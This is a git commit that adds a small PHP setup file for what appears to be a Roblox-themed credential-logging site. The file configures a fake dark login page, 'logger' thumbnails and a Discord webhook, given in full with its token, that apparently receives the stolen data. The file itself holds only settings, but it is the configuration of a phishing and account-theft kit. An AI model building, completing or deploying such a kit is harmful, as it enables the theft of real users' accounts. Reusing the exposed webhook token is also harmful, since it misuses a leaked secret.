7377b08d79ef22020683e064818556d6d741eed5
V2days <vdays7185@gmail.com>
2025-03-19 15:56:41 +0800

    Add files via upload

---
+++ V2testWebsite/setup.php
@@ -0,0 +1,11 @@
+<?php
+$name = 'V2day'; // Change to ur own name
+$thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
+$hex = '#00000'; // color shit
+$triplehook = 'https://discord.com/api/webhooks/1274932079888699393/yC5Q4-Pb9Y9rKe4OzafQQfSTfwns0n7zwH1RrPevDTOwwOvIlTR09OQzjOAaI5RS77wM'; // input ur fucking triplehook webhook here 
+$loginColor = [
+    "theme" => "dark", // change be changed to white to for white login page
+];
+?>
+
+
